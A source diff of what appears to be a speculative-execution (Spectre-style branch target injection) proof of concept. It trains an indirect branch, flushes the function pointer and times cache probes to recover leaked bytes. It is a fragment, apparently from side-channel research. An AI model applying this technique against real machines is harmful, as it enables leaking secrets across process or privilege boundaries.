@@ -46,21 +46,6 @@ uint64_t tot_time = 0;      // Number cycles total
 unsigned int junk=0;    // For rdtscp
 
 
-void *map;
-#define TARGET_FN_ADDR 0x414100401000
-
-// We define this function in assembly (target_fn.S)
-// It is never called directly (essentially dead code)
-// However, indirect.c trains the processor to think the indirect
-// jump in common.c::indirect() is going to call this function
-// We flush the fn_ptr used by indirect(), forcing the CPU to
-// (mis)speculate and start processing this function.
-// In reality, the CPU will (eventually) call check_probes()
-// where we collect results and see what's in cache
-void target_fn(void) __attribute__((section(".targetfn")));
-void end_target_fn(void);
-void end_target_fn2(void);
-
 uint64_t results[NUM_PROBES];
 
 void check_probes() {
@@ -97,6 +82,8 @@ void nop ()
 }
 
 void setup_indirect(uint64_t ctr);
+void targets();
+void end_targets();
 
 void measure() {
     fn_ptr = check_probes;
@@ -110,8 +97,7 @@ void measure() {
         for (i=0; i<2000; i++) {
             _mm_clflush(&fn_ptr);
             //_mm_clflush(&jmp_ptr);
-            //indirect(&jmp_ptr);
-            setup_indirect(0);
+            setup_indirect(signal_idx);
             usleep(1);
         }
         uint64_t avg = 0;
@@ -126,8 +112,8 @@ void measure() {
         }
 
         if (max_res > 10 && avg < 55){
-            printf("[%02lx]: %04lu / %lu = %0.5f%% hits, %lu avg cycles, ps %ld, #%03d, %d misses\n",
-                     max_i, max_res, tot_runs, 100*((float)max_res)/tot_runs, avg, cur_probe_space, signal_idx, misses);
+            printf("'%c' [%02lx]: %04lu / %lu = %0.5f%% hits, %lu avg cycles, ps %ld, #%03d, %d misses\n",
+                     (char)max_i, max_i, max_res, tot_runs, 100*((float)max_res)/tot_runs, avg, cur_probe_space, signal_idx, misses);
             avgpct += ((float)max_res)/tot_runs;
 
             last_i = max_i;
@@ -176,6 +162,10 @@ int main()
 
 
     // TODO: Don't forget to load code into icache!!!
+    volatile uint8_t *p = (void*)targets;
+    while (p < (uint8_t*)end_targets) {
+        *p++;
+    }
 
 
     measure();
